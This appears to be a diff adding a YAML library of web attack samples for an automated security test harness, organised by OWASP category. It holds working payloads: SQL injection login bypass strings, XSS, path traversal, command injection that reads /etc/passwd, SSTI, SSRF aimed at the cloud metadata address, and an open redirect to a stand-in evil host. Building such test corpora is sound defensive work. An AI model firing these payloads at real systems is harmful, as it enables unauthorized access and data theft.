@@ -1,0 +1,165 @@
+# D1 Web 应用层攻击样本库（OWASP Web Top 10 2021：注入/XSS/SSRF/路径穿越/重定向）
+
+- category: sqli
+  owasp: "A03 (Injection)"
+  surface: api
+  samples:
+    - id: sqli-001
+      name: 登录表单 SQL 注入绕过
+      severity: critical
+      target_point: auth_bypass
+      role_context: [student, customer]
+      method: POST
+      path: /api/login
+      body: { username: admin, password: "{payload}" }
+      payload: "{payload}"
+      variables:
+        payload: ["' OR '1'='1", "' OR 1=1 --", "admin'--"]
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ['"role"\s*:\s*"admin"', "登录成功"]
+      tags: [sqli, login]
+
+- category: xss
+  owasp: "A03 (Injection)"
+  surface: api
+  samples:
+    - id: xss-001
+      name: 反射型 XSS
+      severity: high
+      target_point: script_execution
+      role_context: [student, customer]
+      method: GET
+      path: /api/search
+      params: { q: "{payload}" }
+      payload: "{payload}"
+      variables:
+        payload: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ["<script>alert\\(1\\)</script>",
+                          "<img src=x onerror=alert\\(1\\)>"]
+      tags: [xss, reflected]
+
+- category: path_traversal
+  owasp: "A01 (Broken Access Control)"
+  surface: api
+  samples:
+    - id: pt-001
+      name: 路径穿越读取敏感文件
+      severity: critical
+      target_point: file_read
+      role_context: [student, customer]
+      method: GET
+      path: /api/files
+      params: { path: "{payload}" }
+      payload: "{payload}"
+      variables:
+        payload: ["../../secret.txt", "..%2F..%2Fsecret.txt"]
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ["INTERNAL-SECRET"]
+      tags: [traversal]
+
+- category: command_injection
+  owasp: "A03 (Injection)"
+  surface: api
+  samples:
+    - id: ci-001
+      name: OS 命令注入
+      severity: critical
+      target_point: command_exec
+      role_context: [student, customer]
+      method: POST
+      path: /api/ping
+      body: { host: "{payload}" }
+      payload: "{payload}"
+      variables:
+        payload: ["127.0.0.1;cat /etc/passwd", "127.0.0.1|id"]
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ["root:x:0:0", "uid=0"]
+      tags: [cmdi]
+
+- category: ssti
+  owasp: "A03 (Injection)"
+  surface: api
+  samples:
+    - id: ssti-001
+      name: 模板注入（SSTI）
+      severity: critical
+      target_point: template_exec
+      role_context: [student, customer]
+      method: GET
+      path: /api/render
+      params: { template: "{payload}" }
+      payload: "{payload}"
+      variables:
+        payload: ["{{7*7}}", "${7*7}"]
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ["渲染结果: 49"]
+      tags: [ssti]
+
+- category: ssrf
+  owasp: "A10 (Server-Side Request Forgery)"
+  surface: api
+  samples:
+    - id: ssrf-001
+      name: SSRF 探测内网服务
+      severity: critical
+      target_point: internal_probe
+      role_context: [student, customer]
+      method: GET
+      path: /api/fetch
+      params: { url: "{payload}" }
+      payload: "{payload}"
+      variables:
+        payload: ["http://127.0.0.1:8080/admin", "http://169.254.169.254/latest/meta-data/"]
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ["INTERNAL-SERVICE-DATA"]
+      tags: [ssrf]
+
+- category: open_redirect
+  owasp: "A01 (Broken Access Control)"
+  surface: api
+  samples:
+    - id: or-001
+      name: 开放重定向（钓鱼前置）
+      severity: medium
+      target_point: redirect
+      role_context: [student, customer]
+      method: GET
+      path: /api/redirect
+      params: { url: "{payload}" }
+      payload: "https://evil.example.com/phish"
+      expected_signals: [redirect_follow]
+      evidence_patterns: ["evil.example.com"]
+      tags: [redirect]
+
+- category: graphql
+  owasp: "API9 (Improper Inventory Management)"
+  surface: api
+  samples:
+    - id: gql-001
+      name: GraphQL 内省探测（对照样本）
+      severity: medium
+      target_point: schema_disclosure
+      role_context: [student]
+      method: POST
+      path: /graphql
+      payload: '{"query": "{ __schema { types { name } } }"}'
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ['"types"']
+      tags: [graphql, negative]
+
+- category: http_smuggling
+  owasp: "A03 (Injection)"
+  surface: api
+  samples:
+    - id: hs-001
+      name: HTTP 请求走私探测（对照样本）
+      severity: high
+      target_point: request_smuggling
+      role_context: [student]
+      method: POST
+      path: /
+      payload: "0\r\n\r\nGET /smuggled HTTP/1.1\r\nX: 1"
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ["smuggled"]
+      tags: [smuggling, negative]
